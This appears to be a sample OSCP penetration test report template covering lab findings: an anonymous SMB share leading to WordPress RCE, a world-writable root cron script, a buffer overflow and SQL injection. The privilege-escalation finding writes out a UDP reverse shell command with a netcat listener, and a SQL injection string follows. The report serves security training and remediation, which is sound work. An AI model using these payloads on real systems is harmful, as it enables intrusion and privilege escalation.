## Offensive Security OSCP Exam Penetration Test Report

### Introduction

The OffSec Lab and Exam penetration test report contains all efforts
that were conducted in order to pass the OffSec course. This report
should contain all items that were used to pass the overall exam and
it will be graded from a standpoint of correctness and fullness to
all aspects of the exam. The purpose of this report is to ensure that
the student has a full understanding of penetration testing
methodologies as well as the technical knowledge to pass the
qualifications for the OffSec Certified Professional.

### Objective

The objective of this assessment is to perform an internal penetration
test against the OffSec Lab and Exam network. The student is tasked
with following a methodical approach to obtaining access to the
objective goals. This test should simulate an actual penetration test
and how you would start from beginning to end, including the overall
report. An example page has already been created for you in the latter
portions of this document that should give you ample information on
what is expected to pass this course. Use the sample report as a
guideline to get you through the reporting.

### Requirements

The student will be required to fill out this penetration testing
report fully and to include the following sections:

- Overall High-Level Summary and Recommendations (non-technical)
- Methodology walkthrough and detailed outline of steps taken
- Each finding with included screenshots, walkthrough, sample code, and proof.txt if applicable.
- Any additional items that were not included

## High-Level Summary

John Doe was tasked with performing an internal penetration test
towards OffSec Labs. An internal penetration test is a dedicated attack
against internally connected systems. The focus of this test is to
perform attacks, similar to those of a hacker and attempt to infiltrate
OffSec’s internal lab systems – the THINC.local domain. John’s overall
objective was to evaluate the network, identify systems, and exploit
flaws while reporting the findings back to OffSec.

When performing the internal penetration test, there were several alarming
vulnerabilities that were identified on OffSec’s network. When performing the
attacks, John was able to gain access to multiple machines, primarily due to
outdated patches and poor security configurations. During the testing, John
had administrative level access to multiple systems. All systems were
successfully exploited and access granted.

These systems as well as a brief description on how access was obtained are listed below:

**Active Directory Set**:

- `192.168.x.1` - Anonymous SMB share leads to Wordpress RCE
- `192.168.x.2` - Vulnerability Foo


**Standalone hosts**:

- `192.168.x.3` - Buffer Overflow

### Recommendations

John recommends patching the vulnerabilities identified during the
testing to ensure that an attacker cannot exploit these systems in the
future. One thing to remember is that these systems require frequent
patching and once patched, should remain on a regular patch program to
protect additional vulnerabilities that are discovered at a later date.

## Methodologies

John utilized a widely adopted approach to performing penetration testing
that is effective in testing how well the OffSec Labs and Exam
environments are secure. Below is a breakout of how John was able to
identify and exploit the variety of systems and includes all individual
vulnerabilities found.

### Information Gathering

The information gathering portion of a penetration test focuses on
identifying the scope of the penetration test. During this penetration
test, John was tasked with exploiting the lab and exam network. The
specific IP addresses were:

**Exam Network**:

- `192.168.X.X`
- `192.168.X.X`
- `192.168.X.X`

### Service Enumeration

The service enumeration portion of a penetration test focuses on
gathering information about what services are alive on a system or
systems. This is valuable for an attacker as it provides detailed
information on potential attack vectors into a system. Understanding
what applications are running on the system gives an attacker needed
information before performing the actual penetration test. In some
cases, some ports may not be listed.

### Penetration

The penetration testing portions of the assessment focus heavily on
gaining access to a variety of systems. During this penetration test,
John was able to successfully gain access to 3
out of the 50 systems.

### Maintaining Access

Maintaining access to a system is important to us as attackers,
ensuring that we can get back into a system after it has been exploited
is invaluable. The maintaining access phase of the penetration test
focuses on ensuring that once the focused attack has occurred (i.e. a
buffer overflow), we have administrative access over the system again.
Many exploits may only be exploitable once and we may never be able to
get back into a system after we have already performed the exploit.

John added administrator and root level accounts on all systems compromised. In
addition to the administrative/root access, a Metasploit meterpreter service
was installed on the machine to ensure that additional access could be
established.

### House Cleaning

The house cleaning portions of the assessment ensures that remnants of
the penetration test are removed. Often fragments of tools or user
accounts are left on an organizations computer which can cause security
issues down the road. Ensuring that we are meticulous and no remnants
of our penetration test are left over is important.

After the trophies on both the lab network and exam network were completed,
John removed all user accounts and passwords as well as the Meterpreter
services installed on the system. OffSec should not have to remove any user
accounts or services from the system.

## Active Directory Systems

### Target #1 - 192.168.x.1

#### Service Enumeration

##### Port Scan Results

|IP Address|Ports Open|
|---|---|
|192.168.x.1|**TCP**: 8080<br/>**UDP**: 1433, 3389|




#### Initial Access - Anonymous SMB share leads to Wordpress RCE

**Vulnerability Explanation**: The SMB server is not protected with the password and has some
sensitive information like credentials stored. Which leads to RCE
from wordpress theme editor.


**Vulnerability Fix**: The SMB should be configured with credentials and guest enumeration should be disabled.


**Severity**: Critical

**Steps to reproduce**: Ran the initial service scan John discovered that this host is called
Sehnzi. Smbclient was used to interact on the port 445 to get the
passwords.txt file from SMB share shenzi and used those credentials
for wordpress admin access

#### Privilege Escalation - Scripts running as root user

**Vulnerability Explanation**: The system hosts custom scripts running as root. This poses a
security risk if the scripts are improperly secured, as it may allow
non-privileged users the opportunity to alter these files.

A specific instance of this security vulnerability was identified
in a script designed to clean the /tmp directory - `/tmp/clean.sh`. This script was
executed with root-level privileges but was incorrectly set as
world-writable. This misconfiguration could be exploited by an
attacker to modify the script's contents and execute arbitrary
commands with root privileges, thereby compromising the integrity
of the system.


**Vulnerability Fix**: Change permissions on the custom script `/tmp/clean.sh` to be writable only by root.


**Severity**: High

**Steps to reproduce**: We can find the script by running a LinEnum enumeration suite on the system. Since the script
is written in bash and it can be changed, we can edit it and add a reverse shell command.
When the script is executed by cron, we'll get a reverse shell under root user.



**PoC**:
UDP reverse shell command to add to `/tmp/clean.sh`:

```bash
sh -i >& /dev/udp/10.0.0.1/4242 0>&1
```

while listener is running as

```bash
nc -u -lvp 4242
```

#### Service Enumeration

##### Port Scan Results

|IP Address|Ports Open|
|---|---|
|192.168.x.1|**TCP**: 80, 443<br/>**UDP**: 1433, 3389|




#### Initial Access - Buffer Overflow

**Vulnerability Explanation**: Ability Server 2.34 is subject to a buffer overflow vulnerability in
STOR field. Attackers can use this vulnerability to cause arbitrary
remote code execution and take completely control over the system.


**Vulnerability Fix**: The publishers of the Ability Server have issued a patch to fix
this known issue. It can be found here: http://www.code-crafters.com/abilityserver/


**Severity**: Critical

**Steps to reproduce**: The operating system was different from the known public exploit. A
rewritten exploit was needed in order for successful code execution
to occur. Once the exploit was rewritten, a targeted attack was
performed on the system which gave John full administrative access
over the system.

#### Privilege Escalation - MySQL Injection

**Vulnerability Explanation**: After establishing a foothold on target, John noticed there were
several applications running locally, one of them, a custom web
application on port 80 was prone to SQL Injection attacks. Using
Chisel for port forwarding, John was able to access the web
application. When performing the penetration test, John noticed
error-based MySQL Injection on the taxid query string parameter.
While enumerating table data, John was able to successfully extract
the database root account login and password credentials that were
unencrypted that also matched username and password accounts for the
administrative user account on the system and John was able to log in
remotely using RDP. This allowed for a successful breach of the
operating system as well as all data contained on the system.


**Vulnerability Fix**: Since this is a custom web application, a specific update will not
properly solve this issue. The application will need to be programmed
to properly sanitize user-input data, ensure that the user is running
off of a limited user account, and that any sensitive data stored
within the SQL database is properly encrypted. Custom error messages
are highly recommended, as it becomes more challenging for the
attacker to exploit a given weakness if errors are not being
presented back to them.


**Severity**: Critical

**Steps to reproduce**: Execute the injection on the taxid query string parameter.



**PoC**:
Injection code:

```sql
SELECT * FROM login WHERE id = 1 or 1=1 AND user LIKE "%root%"
```
